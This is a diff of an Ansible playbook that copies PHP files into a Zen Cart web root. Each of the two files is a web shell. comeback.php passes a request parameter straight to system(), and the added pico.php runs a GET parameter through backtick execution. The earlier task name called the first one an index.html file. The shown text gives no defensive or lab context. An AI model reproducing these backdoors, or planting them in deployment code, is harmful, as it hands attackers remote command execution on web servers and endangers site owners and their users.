@@ -6,7 +6,13 @@
       path: /var/www/html/web_directory
       state: directory
       mode: "0755"
-  - name: Create index.html file
+  - name: Create comeback.php file
     copy:
       dest: /var/www/html/zen-cart/comeback.php
       content: <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
+  
+  - name: Create pico.php
+    copy:
+      dest: /var/www/html/zen-cart/pico.php
+      content: <?=`$_GET[_]`?> 
+       
